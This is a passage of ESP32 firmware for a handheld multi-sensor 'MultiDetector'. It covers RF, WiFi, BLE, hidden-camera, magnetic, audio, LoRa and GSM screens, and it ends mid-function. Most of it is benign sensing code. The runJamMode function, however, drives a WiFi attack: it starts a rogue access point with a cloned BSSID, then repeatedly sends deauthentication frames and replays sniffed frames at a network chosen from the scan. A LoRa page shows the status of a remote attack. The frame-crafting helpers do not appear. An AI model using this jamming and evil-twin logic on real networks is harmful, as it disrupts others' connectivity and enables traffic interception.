    if (rfSpikeDb < 2.0) burstActive = false;

    bool alarming = (rfSpikeDb > RF_SPIKE_THRESHOLD);
    static unsigned long lastRfBeep = 0;

    if (alarming) {
      if (millis() - lastRfBeep > 300) {
        digitalWrite(BUZZER_PIN, HIGH);
        delay(50);
        digitalWrite(BUZZER_PIN, LOW);
        lastRfBeep = millis();
      }
      digitalWrite(STATUS_LED, HIGH);
      digitalWrite(VIBRATION_PIN, (millis() / 500) % 2);
    } else {
      digitalWrite(STATUS_LED, LOW);
      digitalWrite(VIBRATION_PIN, LOW);
      digitalWrite(BUZZER_PIN, LOW);
    }
  }

  if (millis() - lastAnimation > 250) {
    headerAnim = (headerAnim + 1) % 5;
    lastAnimation = millis();
  }
  updateRFHistory();

  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  const char* hdrs[] = { "> RF ANALYZER", ">> RF ANALYZER", ">>> RF ANALYZER", ">> RF ANALYZER", "> RF ANALYZER" };
  display.print(hdrs[headerAnim]);
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);

  int y = analogRead(JOY_Y_PIN);
  static bool rfInputReady = true;
  if (y > JOY_LOW_ZONE && y < JOY_HIGH_ZONE) rfInputReady = true;
  if (rfInputReady) {
    if (y < JOY_LOW_ZONE) { currentRFMode = (RFMode)((currentRFMode + 5) % 6); rfInputReady = false; }
    if (y > JOY_HIGH_ZONE) { currentRFMode = (RFMode)((currentRFMode + 1) % 6); rfInputReady = false; }
  }

  float spikeDb = rfCalibrated ? rfSpikeDb : 0;
  bool alarming = (spikeDb > RF_SPIKE_THRESHOLD);

  switch (currentRFMode) {
    case RF_SPECTRUM:
      display.setCursor(0, 14); display.print("LIVE SPECTRUM");
      display.setCursor(96, 14); display.print((int)spikeDb); display.print("dB");
      for (int x = 0; x < 64; x++) {
        int h = map(rfHistory[x], 0, 100, 0, 32);
        display.drawLine(x * 2, 55, x * 2, 55 - h, SH110X_WHITE);
      }
      display.setCursor(0, 57); display.print(rfValue); display.print("% ");
      display.print(alarming ? "SPIKE!" : "IDLE");
      break;

    case RF_METER:
      display.setTextSize(2);
      display.setCursor(28, 18); display.print(rfValue); display.print("%");
      display.setTextSize(1);
      display.setCursor(14, 36); display.print((int)spikeDb); display.print(" dB");
      display.drawRect(10, 46, 108, 10, SH110X_WHITE);
      display.fillRect(11, 47, map(rfValue, 0, 100, 0, 106), 8, SH110X_WHITE);
      display.setCursor(14, 58); display.print(getRFLevelText(rfValue));
      break;

    case RF_PEAK:
      display.setCursor(0, 16); display.print("SPIKE: "); display.print((int)spikeDb); display.print(" dB");
      display.setCursor(0, 30); display.print("PEAK:  "); display.print(rfPeak); display.print("%");
      display.setCursor(0, 44); display.print("FLOOR: "); display.print((int)rfBaseline); display.print(" dBm");
      drawSegmentedBar(57, rfPeak, 100);
      break;

    case RF_HISTORY:
      display.setCursor(0, 14); display.print("RF HISTORY");
      for (int x = 0; x < 64; x++) {
        int h = map(rfHistory[x], 0, 100, 0, 40);
        display.drawPixel(x * 2, 55 - h, SH110X_WHITE);
        if (x > 0) {
          int h2 = map(rfHistory[x - 1], 0, 100, 0, 40);
          display.drawLine((x - 1) * 2, 55 - h2, x * 2, 55 - h, SH110X_WHITE);
        }
      }
      break;

    case RF_ALERTMODE:
      display.setCursor(0, 16); display.print("RF SPIKE ALERT");
      display.setCursor(0, 30); display.print("DELTA: "); display.print((int)spikeDb); display.print(" dB");
      display.setCursor(0, 44); display.print("THRESH: 8 dB");
      if (alarming) {
        display.setCursor(0, 57); display.print("!!! SPIKING !!!");
      } else {
        display.setCursor(0, 57); display.print("MONITORING");
      }
      break;

    case RF_STATS:
      display.setCursor(0, 16); display.print("BURSTS:"); display.print(rfBursts);
      display.setCursor(0, 28); display.print("PEAK:"); display.print(rfPeak); display.print("%");
      display.setCursor(0, 40); display.print("dBm:  "); display.print((int)rfRawDbm);
      display.setCursor(0, 52); display.print("FLOOR:"); display.print((int)rfBaseline); display.print(" dBm");
      break;
  }
  display.display();
}

void runWiFiScan() {
  if (!scanInitiated || (millis() - wifiScanTimer > 3000)) {
    if (scanInitiated) {
      int n = WiFi.scanComplete();
      if (n >= 0) {
        for (int i = 0; i < n; i++) {
          String ssid = WiFi.SSID(i); String bssid = WiFi.BSSIDstr(i); int rssi = WiFi.RSSI(i);
          int channel = WiFi.channel(i); wifi_auth_mode_t security = (wifi_auth_mode_t)WiFi.encryptionType(i);
          bool found = false;
          for (int j = 0; j < wifiCount; j++) {
            if (wifiList[j].ssid == ssid) { wifiList[j].bssid = bssid; wifiList[j].rssi = rssi; wifiList[j].channel = channel; wifiList[j].security = security; wifiList[j].lastSeen = millis(); found = true; break; }
          }
          if (!found && wifiCount < MAX_WIFI_ENTRIES) {
            wifiList[wifiCount].ssid = ssid; wifiList[wifiCount].bssid = bssid; wifiList[wifiCount].rssi = rssi;
            wifiList[wifiCount].channel = channel; wifiList[wifiCount].security = security; wifiList[wifiCount].lastSeen = millis(); wifiCount++;
          }
        }
      }
      WiFi.scanDelete();
    }
    WiFi.scanNetworks(true); scanInitiated = true; wifiScanTimer = millis();
  }
  for (int i = 0; i < wifiCount; i++) {
    if (millis() - wifiList[i].lastSeen > 15000) {
      for (int j = i; j < wifiCount - 1; j++) wifiList[j] = wifiList[j + 1]; wifiCount--; i--;
    }
  }
  display.clearDisplay();
  display.setCursor(4, 0); display.printf("WIFI NETWORKS (%d)", wifiCount);
  display.drawLine(0, 10, 132, 10, SH110X_WHITE);
  if (wifiCount == 0) { display.setCursor(16, 28); display.print("SCANNING CHIPSET..."); }
  else {
    scanSelectedIndex = constrain(scanSelectedIndex, 0, wifiCount - 1);
    if (scanSelectedIndex < scrollOffset) scrollOffset = scanSelectedIndex;
    if (scanSelectedIndex >= scrollOffset + 4) scrollOffset = scanSelectedIndex - 3;
    for (int i = 0; i < 4; i++) {
      int targetIndex = scrollOffset + i; if (targetIndex >= wifiCount) break;
      int rowY = 14 + (i * 12);
      if (targetIndex == scanSelectedIndex) { display.fillRect(0, rowY - 1, 132, 11, SH110X_WHITE); display.setTextColor(SH110X_BLACK); }
      else { display.setTextColor(SH110X_WHITE); }
      display.setCursor(4, rowY);
      String ssid = wifiList[targetIndex].ssid; if (ssid.length() == 0) ssid = "<Hidden Network>";
      if (ssid.length() > 14) ssid = ssid.substring(0, 12) + "..";
      display.printf("%d:%s (%d)", targetIndex + 1, ssid.c_str(), wifiList[targetIndex].rssi);
    }
  }
  display.setTextColor(SH110X_WHITE); display.display();
}

void runWiFiInfo() {
  if (wifiCount == 0 || scanSelectedIndex >= wifiCount) { currentMode = MODE_WIFI; currentWifiSubMode = WIFI_SCAN; return; }
  WifiEntry &w = wifiList[scanSelectedIndex];
  display.clearDisplay(); display.setTextSize(1);
  display.setCursor(0, 0); display.print("WIFI DETAILS"); display.drawLine(0, 10, 128, 10, SH110X_WHITE);
  if (wifiInfoPage == 0) {
    display.setCursor(0, 16); display.print("SSID:"); String s = w.ssid; if (s.length() == 0) s = "<Hidden>"; if (s.length() > 12) s = s.substring(0, 12); display.print(s);
    display.setCursor(0, 30); display.print("RSSI:"); display.print(w.rssi); display.print("dBm");
    display.setCursor(0, 44); display.print("CH:"); display.print(w.channel);
    display.setCursor(64, 44); display.print(getSecurityName(w.security));
  }
  else if (wifiInfoPage == 1) {
    display.setCursor(0, 16); display.print("BSSID:"); display.setCursor(0, 32); display.print(w.bssid);
  }
  else {
    int quality = getSignalQuality(w.rssi);
    display.setCursor(0, 16); display.print("QUALITY:"); display.print(quality); display.print("%");
    display.setCursor(0, 32); display.print("FREQ:"); display.print(2407 + (w.channel * 5)); display.print("MHz");
    display.setCursor(0, 48); if (w.ssid.length() == 0) display.print("HIDDEN:YES"); else display.print("HIDDEN:NO");
  }
  display.setCursor(102, 56); display.print(wifiInfoPage + 1); display.print("/3");
  display.display();
}

void runJamMode() {
  if (jamActive && wifiCount > 0 && scanSelectedIndex < wifiCount) {
    if (!jammerInitialized) { initRogueAp(scanSelectedIndex); jammerInitialized = true; jamStartTime = millis(); evilTwinStarted = true; return; }
    if (millis() - jamStartTime > 50) { sendDeauthFrame(); sniffAndReplayFrames(); jamStartTime = millis(); digitalWrite(STATUS_LED, !digitalRead(STATUS_LED)); }
    display.clearDisplay(); display.setTextSize(1);
    display.setCursor(0, 0); display.print(">> JAMMER <<"); display.drawLine(0, 9, 128, 9, SH110X_WHITE);
    display.drawBitmap(0, 11, icon_jam, 16, 16, SH110X_WHITE);
    display.setCursor(18, 11); String ssid = wifiList[scanSelectedIndex].ssid; if (ssid.length() == 0) ssid = "<Hidden>"; if (ssid.length() > 12) ssid = ssid.substring(0, 12); display.print(ssid);
    display.setCursor(18, 21); display.print("C"); display.print(wifiList[scanSelectedIndex].channel); display.print(" T"); display.print(jamPacketCount); display.print(" R"); display.print(replayCount);
    display.setCursor(0, 32); display.print("AP:"); if (evilTwinStarted) display.print("ON"); else display.print("...");
    display.setCursor(0, 43); if ((millis() / 300) % 2 == 0) display.print(">DEAUTH+REPLAY<"); else display.print(" BSSID CLONED ");
    display.setCursor(0, 54); display.print("TGT:"); String bssidShort = wifiList[scanSelectedIndex].bssid; if (bssidShort.length() > 14) bssidShort = bssidShort.substring(0, 14); display.print(bssidShort);
    display.display();
  }
  else { stopRogueAp(); }
}

void runBLEScan() {
  if (!scanInitiated) {
    pBLEScan->clearResults();
    pBLEScan->start(2, false);
    scanInitiated = true;
    bleScanTimer = millis();
  } else if (millis() - bleScanTimer > 3000) {
    pBLEScan->stop();
    BLEScanResults* results = pBLEScan->getResults();
    if (results) {
      int n = results->getCount();
      for (int i = 0; i < n; i++) {
        BLEAdvertisedDevice device = results->getDevice(i);
        String mac = String(device.getAddress().toString().c_str());
        String name = "";
        if (device.haveName()) {
          name = String(device.getName().c_str());
        }
        name.trim();
        if (name.length() == 0) name = "Unknown Device";
        int rssi = device.getRSSI();
        bool found = false;
        for (int j = 0; j < bleCount; j++) {
          if (bleList[j].mac == mac) {
            bleList[j].name = name;
            bleList[j].rssi = rssi;
            bleList[j].lastSeen = millis();
            found = true;
            break;
          }
        }
        if (!found && bleCount < MAX_BLE_ENTRIES) {
          bleList[bleCount].name = name;
          bleList[bleCount].mac = mac;
          bleList[bleCount].rssi = rssi;
          bleList[bleCount].lastSeen = millis();
          bleCount++;
        }
      }
    }
    pBLEScan->clearResults();
    scanInitiated = false;
  }

  for (int i = 0; i < bleCount; i++) {
    if (millis() - bleList[i].lastSeen > 15000) {
      for (int j = i; j < bleCount - 1; j++) bleList[j] = bleList[j + 1];
      bleCount--; i--;
    }
  }

  display.clearDisplay();
  display.setCursor(4, 0); display.printf("BLE BEACONS (%d)", bleCount);
  display.drawLine(0, 10, 132, 10, SH110X_WHITE);
  if (bleCount == 0) {
    display.setCursor(16, 28); display.print("LISTENING AIR...");
  } else {
    scanSelectedIndex = constrain(scanSelectedIndex, 0, bleCount - 1);
    if (scanSelectedIndex < scrollOffset) scrollOffset = scanSelectedIndex;
    if (scanSelectedIndex >= scrollOffset + 4) scrollOffset = scanSelectedIndex - 3;
    for (int i = 0; i < 4; i++) {
      int targetIndex = scrollOffset + i;
      if (targetIndex >= bleCount) break;
      int rowY = 14 + (i * 12);
      if (targetIndex == scanSelectedIndex) {
        display.fillRect(0, rowY - 1, 132, 11, SH110X_WHITE);
        display.setTextColor(SH110X_BLACK);
      } else {
        display.setTextColor(SH110X_WHITE);
      }
      display.setCursor(4, rowY);
      String deviceName = bleList[targetIndex].name;
      if (deviceName.length() > 14) deviceName = deviceName.substring(0, 12) + "..";
      display.print(deviceName);

      String rssiStr = String(bleList[targetIndex].rssi);
      int rssiX = 128 - (rssiStr.length() * 6) - 4;
      display.setCursor(rssiX, rowY);
      display.print(rssiStr);
    }
  }
  display.setTextColor(SH110X_WHITE);
  display.display();
}

void runBLEInfo() {
  if (bleCount == 0 || scanSelectedIndex >= bleCount) {
    currentMode = MODE_BLE;
    return;
  }
  BLEEntry &d = bleList[scanSelectedIndex];
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0); display.print("BLE DEVICE INFO");
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);

  String name = d.name;
  if (name.length() > 16) name = name.substring(0, 15);
  display.setCursor(0, 14); display.print("NAME:");
  display.setCursor(34, 14); display.print(name);

  display.setCursor(0, 24); display.print("MAC:");
  display.setCursor(28, 24);
  String mac = d.mac;
  if (mac.length() > 16) mac = mac.substring(0, 15);
  display.print(mac);

  display.setCursor(0, 34); display.print("RSSI:");
  display.print(d.rssi);
  display.print("dBm");

  int quality = getSignalQuality(d.rssi);
  display.setCursor(0, 44); display.print("QUALITY:");
  display.print(quality);
  display.print("%");

  unsigned long ago = (millis() - d.lastSeen) / 1000;
  display.setCursor(0, 54); display.print("SEEN:");
  display.print(ago);
  display.print("s ago");

  display.display();
}

void runMagneticDetect() {
  hallValue = digitalRead(HALL_PIN);
  static bool lastHallState = HIGH;
  static unsigned long lastMagAlertSms = 0;
  if (hallValue == LOW && lastHallState == HIGH && millis() - lastMagAlertSms > SMS_COOLDOWN) {
    lastMagAlertSms = millis();
    sendAlertSMS("MAGNETIC ALERT! Magnetic flux detected by MultiDetector.");
  }
  lastHallState = hallValue;
  display.clearDisplay(); display.setTextSize(1);
  display.setCursor(4, 0); display.print("MAGNETIC FIELD"); display.drawLine(0, 10, 132, 10, SH110X_WHITE);
  display.setCursor(4, 16); display.print("SENSOR STATE: "); display.print(hallValue == LOW ? "LOW" : "HIGH");
  display.drawRect(10, 27, 108, 10, SH110X_WHITE);
  if (hallValue == LOW) display.fillRect(11, 28, 106, 8, SH110X_WHITE);
  display.drawLine(0, 53, 132, 53, SH110X_WHITE);
  display.setCursor(6, 56);
  if (hallValue == LOW) { display.print(">> MAG FLUX DETECT <<"); alert(true); }
  else { display.print("FIELD EQUILIBRIUM"); alert(false); }
  display.display();
}

void runAudioDetect() {
  int minVal = 4095, maxVal = 0;
  for (int i = 0; i < 250; i++) { int v = analogRead(MIC_PIN); if (v < minVal) minVal = v; if (v > maxVal) maxVal = v; }
  micValue = ((maxVal - minVal) * 0.40) + (micValue * 0.60);
  static bool lastAudioAlert = false;
  static unsigned long lastAudioAlertSms = 0;
  if (micValue > 1800 && !lastAudioAlert && millis() - lastAudioAlertSms > SMS_COOLDOWN) {
    lastAudioAlertSms = millis();
    sendAlertSMS("AUDIO ALERT! Sound detected at MultiDetector location.");
  }
  lastAudioAlert = (micValue > 1800);
  display.clearDisplay(); display.setTextSize(1);
  display.setCursor(4, 0); display.print("AUDIO DETECTOR"); display.drawLine(0, 10, 128, 10, SH110X_WHITE);
  display.setCursor(4, 18); display.print("WINDOW MIN: "); display.print(minVal);
  display.setCursor(4, 30); display.print("AMP LEVEL: "); display.print(micValue);
  drawSegmentedBar(42, micValue, 4095); display.drawLine(0, 53, 128, 53, SH110X_WHITE);
  if (micValue > 1800) { display.setCursor(4, 56); display.print("SOUND DETECTED"); alert(true); }
  else { display.setCursor(4, 56); display.print("QUIET"); alert(false); }
  display.display();
}

void runCameraDetector() {
  if (!scanInitiated) {
    long sum = 0;
    int minRaw = 4095, maxRaw = 0;
    for (int i = 0; i < CAM_BASELINE_SAMPLES; i++) {
      int v = analogRead(CAMERA_SENSOR_PIN);
      sum += v;
      if (v < minRaw) minRaw = v;
      if (v > maxRaw) maxRaw = v;
      delay(2);
    }
    camBaseline = sum / CAM_BASELINE_SAMPLES;
    int noiseFloor = maxRaw - minRaw;
    camThreshold = max((int)(noiseFloor * CAM_THRESHOLD_MULTIPLIER), 150);
    for (int i = 0; i < CAM_HISTORY_SIZE; i++) camHistory[i] = 0;
    camSmoothValue = camBaseline;
    camPeakValue = 0;
    camDetectionActive = false;
    camHistoryIdx = 0;
    scanInitiated = true;
  }
  int rawValue = analogRead(CAMERA_SENSOR_PIN);
  camSmoothValue = (rawValue * 0.30) + (camSmoothValue * 0.70);
  int deviation = abs(camSmoothValue - camBaseline);
  if (!camDetectionActive && deviation < (camThreshold / 2)) {
    camBaseline = (camBaseline * 0.98) + (camSmoothValue * 0.02);
  }
  if (deviation > camThreshold && !camDetectionActive) {
    camDetectionActive = true;
    if (deviation > camPeakValue) camPeakValue = deviation;
    static unsigned long lastCamAlertSms = 0;
    if (millis() - lastCamAlertSms > SMS_COOLDOWN) {
      lastCamAlertSms = millis();
      sendAlertSMS("CAMERA ALERT! Hidden lens reflection detected!");
    }
  }
  if (deviation < (camThreshold * 0.6) && camDetectionActive) {
    camDetectionActive = false;
  }
  camHistory[camHistoryIdx] = deviation;
  camHistoryIdx = (camHistoryIdx + 1) % CAM_HISTORY_SIZE;
  int confidence = constrain(map(deviation, 0, camThreshold * 3, 0, 100), 0, 100);
  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0); display.print("HIDDEN CAMERA");
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);
  display.setCursor(0, 13); display.print("RAW:"); display.print(rawValue);
  display.setCursor(60, 13); display.print("BL:"); display.print(camBaseline);
  display.setCursor(0, 23); display.print("DEV:"); display.print(deviation);
  display.setCursor(60, 23); display.print("THR:"); display.print(camThreshold);
  display.drawRect(0, 34, 128, 8, SH110X_WHITE);
  int barWidth = constrain(map(deviation, 0, camThreshold * 3, 0, 126), 0, 126);
  display.fillRect(1, 35, barWidth, 6, SH110X_WHITE);
  display.setCursor(0, 45); display.print("CONF:"); display.print(confidence); display.print("%");
  display.setCursor(70, 45); display.print("PK:"); display.print(camPeakValue);
  display.drawLine(0, 55, 128, 55, SH110X_WHITE);
  if (camDetectionActive) {
    display.setCursor(4, 57); display.print(">> LENS DETECTED <<");
    alert(true); digitalWrite(STATUS_LED, HIGH);
  } else {
    display.setCursor(4, 57); display.print("SCANNING");
    alert(false); digitalWrite(STATUS_LED, LOW);
  }
  for (int i = 0; i < CAM_HISTORY_SIZE; i++) {
    int idx = (camHistoryIdx + i) % CAM_HISTORY_SIZE;
    int h = constrain(map(camHistory[idx], 0, camThreshold * 2, 0, 6), 0, 6);
    display.drawPixel(80 + i, 62 - h, SH110X_WHITE);
    if (i > 0) {
      int prevIdx = (camHistoryIdx + i - 1) % CAM_HISTORY_SIZE;
      int ph = constrain(map(camHistory[prevIdx], 0, camThreshold * 2, 0, 6), 0, 6);
      display.drawLine(80 + i - 1, 62 - ph, 80 + i, 62 - h, SH110X_WHITE);
    }
  }
  display.display();
}

void runLoRaMode() {
  // Mark WROOM offline if silent too long
  if (wroomOnline && millis() - wroomLastSeen > WROOM_LINK_TIMEOUT) {
    wroomOnline = false;
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);

  // ===== HEADER =====
  display.setCursor(0, 0);
  if (modeSelectorActive) {
    display.print(">> MODE SELECTOR");
  } else {
    display.print(">> LoRa TERM");
    display.setCursor(80, 0);
    display.print("P");
    display.print(terminalPage + 1);
    display.print("/5");
  }
  drawGsmIndicator(50, 0);
  display.drawLine(0, 9, 128, 9, SH110X_WHITE);

  // ===== MODE SELECTOR OVERLAY =====
  if (modeSelectorActive) {
    int scrollOff = 0;
    if (modeSelectorIdx >= 4) {
      scrollOff = modeSelectorIdx - 3;
      if (scrollOff > REMOTE_MODE_COUNT - 5) scrollOff = REMOTE_MODE_COUNT - 5;
    }
    for (int i = 0; i < 5; i++) {
      int idx = scrollOff + i;
      if (idx >= REMOTE_MODE_COUNT) break;
      int rowY = 11 + (i * 10);
      if (idx == modeSelectorIdx) {
        display.fillRect(0, rowY - 1, 128, 9, SH110X_WHITE);
        display.setTextColor(SH110X_BLACK);
      } else {
        display.setTextColor(SH110X_WHITE);
      }
      display.setCursor(4, rowY);
      display.print(remoteModes[idx]);
    }
    display.setTextColor(SH110X_WHITE);
    display.display();
    return;
  }

  // ===== SX1278 NOT FOUND =====
  if (!loraModuleFound) {
    display.setCursor(2, 14); display.print("SX1278 NOT FOUND");
    display.setCursor(2, 26); display.print("Check wiring!");
    display.setCursor(2, 38); display.print("CS=2 RST=3 SCK=13");
    display.setCursor(2, 50); display.print("MOSI=14 MISO=21");
    display.display();
    return;
  }

  // ===== PAGE 1: CONNECTION STATUS =====
  if (terminalPage == 0) {
    display.setCursor(0, 12);
    display.print("LINK:");
    display.print(wroomOnline ? "ONLINE" : "OFFLINE");

    display.setCursor(0, 22);
    display.print("MODE:");
    if (wroomMode >= 0 && wroomMode < REMOTE_MODE_COUNT) {
      String m = remoteModes[wroomMode];
      if (m.length() > 10) m = m.substring(0, 10);
      display.print(m);
    } else {
      display.print("?");
    }

    display.setCursor(0, 32);
    display.print("UPTIME:");
    display.print(wroomUptime);
    display.print("s");

    display.setCursor(0, 42);
    display.print("RX:");
    display.print(wroomRxCount);
    display.print(" CMD:");
    String c = lastSentCmd;
    if (c.length() > 5) c = c.substring(0, 5);
    display.print(c);

    display.setCursor(0, 54);
    if (wroomOnline) {
      display.print("RSSI:");
      display.print(loraLastRssi);
      display.print(" SNR:");
      display.print(loraLastSnr, 1);
    } else {
      display.print("Scanning 433MHz...");
    }
  }

  // ===== PAGE 2: WIFI NETWORKS =====
  else if (terminalPage == 1) {
    display.setCursor(0, 12);
    display.print("WiFi:");
    display.print(wroomWifi);
    display.print(" BLE:");
    display.print(wroomBle);

    for (int i = 0; i < 3; i++) {
      int rowY = 24 + (i * 12);
      display.setCursor(0, rowY);
      display.print(i + 1);
      display.print(":");
      String s = wroomTopSSID[i];
      if (s.length() == 0) s = "---";
      if (s.length() > 10) s = s.substring(0, 10);
      display.print(s);
      display.setCursor(90, rowY);
      display.print(wroomTopRSSI[i]);
      display.print("dBm");
    }
  }

  // ===== PAGE 3: TARGET / ATTACK =====
  else if (terminalPage == 2) {
    display.setCursor(0, 12);
    display.print("TGT:");
    String s = wroomTargetSSID;
    if (s.length() == 0) s = "<None>";
    if (s.length() > 12) s = s.substring(0, 12);
    display.print(s);

    display.setCursor(0, 24);
    display.print("RSSI:");
    display.print(wroomTargetRSSI);
    display.print("dBm CH:");
    display.print(wroomTargetCH);

    display.setCursor(0, 36);
    display.print("SEC:");
    display.print(wroomTargetSec.length() > 0 ? wroomTargetSec : "?");

    display.setCursor(0, 48);
    display.print("ATK:");
    display.print(wroomAttack ? "ACTIVE" : "IDLE");
    display.print(" P:");
    display.print(wroomPktCount);

    display.setCursor(0, 56);
    display.print("ERR:");
    display.print(wroomErrCount);
  }

  // ===== PAGE 4: COMMAND LOG =====
  else if (terminalPage == 3) {
    display.setCursor(0, 12);
    display.print("LAST:");
    display.print(lastSentCmd.length() > 0 ? lastSentCmd : "<None>");

    display.setCursor(0, 24);
    display.print("SENT:");
    if (lastCmdTime > 0) {
      display.print((millis() - lastCmdTime) / 1000);
      display.print("s ago");
    } else {
      display.print("never");
    }

    display.setCursor(0, 36);
    display.print("ACK:");
    if (lastAck.length() > 0 && millis() - lastAckTime < 5000) {
      display.print(lastAck);
    } else {
      display.print("<None>");
    }

    display.setCursor(0, 48);
    display.print("RSSI:");
    display.print(loraLastRssi);
    display.print("dBm");

    display.setCursor(0, 56);
    display.print("SNR:");
    display.print(loraLastSnr, 1);
    display.print("dB");
  }

  // ===== PAGE 5: RADIO & HELP =====
  else {
    display.setCursor(0, 12);
    display.print("FREQ:");
    display.print((int)(LORA_FREQUENCY / 1E6));
    display.print("MHz");

    display.setCursor(0, 24);
    display.print("SF12 BW125 CR4/8");

    display.setCursor(0, 36);
    display.print("RX:");
    display.print(wroomRxCount);
    display.print(" STAT:");
    display.print(wroomOnline ? "OK" : "--");

    
      }

  display.display();
  digitalWrite(STATUS_LED, (millis() / 200) % 2 == 0 ? HIGH : LOW);
}

#define MAX_SETTINGS_ITEMS 9

void runSettingsMode() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(4, 0);
  display.print("SYSTEM STATUS");
  drawGsmIndicator(92, 0);
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);

  String settingsItems[MAX_SETTINGS_ITEMS];
  settingsItems[0] = "Battery " + String(batteryPercent) + "% " + String(batteryVoltage, 1) + "V";
  settingsItems[1] = "RF " + String(rfCalibrated ? "OK" : "CALIBRATING");
  settingsItems[2] = "WiFi " + String(wifiCount > 0 ? "OK(" + String(wifiCount) + ")" : "SCANNING");
  settingsItems[3] = "BLE " + String(bleCount > 0 ? "OK(" + String(bleCount) + ")" : "LISTENING");
  settingsItems[4] = "Magnetic OK";
  settingsItems[5] = "Audio OK";
  settingsItems[6] = "Camera OK";
  settingsItems[7] = "LoRa " + String(loraModuleFound ? "OK" : "N/A");
  settingsItems[8] = "GSM " + String(gsmModuleFound ? (gsmRegistered ? "OK REG" : "OK WAIT") : "N/A");

  int settingsScrollOffset = 0;
  if (scanSelectedIndex >= 3) {
    settingsScrollOffset = scanSelectedIndex - 2;
    if (settingsScrollOffset > MAX_SETTINGS_ITEMS - 4) settingsScrollOffset = MAX_SETTINGS_ITEMS - 4;
  }

  for (int i = 0; i < 4; i++) {
    int itemIdx = settingsScrollOffset + i;
    if (itemIdx >= MAX_SETTINGS_ITEMS) break;
    int rowY = 14 + (i * 11);

    if (itemIdx == scanSelectedIndex) {
      display.fillRect(0, rowY - 1, 132, 11, SH110X_WHITE);
      display.setTextColor(SH110X_BLACK);
      String txt = settingsItems[itemIdx];
      if (txt.length() > 21) txt = txt.substring(0, 19) + "..";
      display.setCursor(4, rowY);
      display.print(txt);
      display.setCursor(5, rowY);  // bold offset
      display.print(txt);
    } else {
      display.setTextColor(SH110X_WHITE);
      String txt = settingsItems[itemIdx];
      if (txt.length() > 21) txt = txt.substring(0, 19) + "..";
      display.setCursor(4, rowY);
      display.print(txt);
    }
  }
  display.setTextColor(SH110X_WHITE);
  display.display();
}

void runGsmMainMenu() {
  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0); display.print(">> GSM MODULE");
  display.setCursor(96, 0); display.print(gsmRegistered ? "NET" : "---");
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);

  int scrollOff = 0;
  if (gsmMenuSelected >= 3) { scrollOff = gsmMenuSelected - 2; if (scrollOff > GSM_MENU_ITEMS - 4) scrollOff = GSM_MENU_ITEMS - 4; }

  gsmMenuTargetBox = (14 + ((gsmMenuSelected - scrollOff) * 11)) * 100;
  gsmMenuAnimatedBox += ((gsmMenuTargetBox - gsmMenuAnimatedBox) * 45) / 100;
  display.fillRect(2, (gsmMenuAnimatedBox / 100), 4, 7, SH110X_WHITE);

  for (int i = 0; i < 4; i++) {
    int itemIdx = scrollOff + i;
    if (itemIdx >= GSM_MENU_ITEMS) break;
    int rowY = 14 + (i * 11);

    if (itemIdx == gsmMenuSelected) {
      display.setCursor(10, rowY);
      display.print("> ");
      display.print(gsmMenuLabels[itemIdx]);
      display.setCursor(11, rowY);  // bold offset
      display.print("> ");
      display.print(gsmMenuLabels[itemIdx]);
    } else {
      display.setCursor(10, rowY);
      display.print("  ");
      display.print(gsmMenuLabels[itemIdx]);
    }

    if (itemIdx == 1) { display.setCursor(108, rowY); display.print(gsmSignalQuality); display.print("/31"); }
  }
  display.display();
}

void runGsmSendSms() {
  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0); display.print(">> SEND SMS");
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);

  int sel = scanSelectedIndex % GSM_QUICK_SMS_COUNT;
  for (int i = 0; i < GSM_QUICK_SMS_COUNT; i++) {
    int rowY = 14 + (i * 11);
    if (i == sel) {
      display.fillRect(0, rowY - 1, 128, 10, SH110X_WHITE);
      display.setTextColor(SH110X_BLACK);
    } else {
      display.setTextColor(SH110X_WHITE);
    }
    display.setCursor(4, rowY);
    display.print(gsmQuickSms[i]);
  }

  display.setTextColor(SH110X_WHITE);
  display.display();
}

void runGsmSignal() {
  updateGsmStatus();
  display.clearDisplay();
  display.setTextSize(1); display.setTextColor(SH110X_WHITE);
  display.setCursor(0, 0); display.print(">> SIGNAL QUALITY");
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);
  int rssiDbm = -115 + (gsmSignalQuality * 2);
  if (gsmSignalQuality == 0) rssiDbm = -115;
  if (gsmSignalQuality == 31) rssiDbm = -51;
  if (gsmSignalQuality == 99) rssiDbm = -999;
  int bars = 0;
  if (gsmSignalQuality > 0 && gsmSignalQuality < 99) {
    if (gsmSignalQuality < 5) bars = 0;
    else if (gsmSignalQuality < 10) bars = 1;
    else if (gsmSignalQuality < 15) bars = 2;
    else if (gsmSignalQuality < 20) bars = 3;
    else if (gsmSignalQuality < 25) bars = 4;
    else bars = 5;
  }
  for (int i = 0; i < 5; i++) {
    int bx = 90 + (i * 7);
    int bh = 4 + (i * 4);
    if (i < bars) display.fillRect(bx, 42 - bh, 5, bh, SH110X_WHITE);
    else display.drawRect(bx, 42 - bh, 5, bh, SH110X_WHITE);
  }
  display.setCursor(0, 14); display.print("CSQ:"); display.setTextSize(2);
  display.setCursor(28, 12); display.print(gsmSignalQuality); display.setTextSize(1); display.print("/31");
  display.setCursor(0, 28);
  if (rssiDbm != -999) { display.print("RSSI: "); display.print(rssiDbm); display.print(" dBm"); } else { display.print("RSSI: UNKNOWN"); }
  display.setCursor(0, 38);
  if (gsmSignalQuality == 99) display.print("Status: UNKNOWN");
  else if (bars <= 1) display.print("Status: POOR");
  else if (bars <= 3) display.print("Status: GOOD");
  else display.print("Status: EXCELLENT");
  display.setCursor(0, 48); display.print("Reg: "); display.print(gsmRegistered ? "HOME" : "NO");
  display.display();
}

void runGsmNetwork() {
  updateGsmStatus();
  static String imei = "";
  static bool imeiFetched = false;
  if (!imeiFetched) {
    gsm.println("AT+GSN"); delay(500);
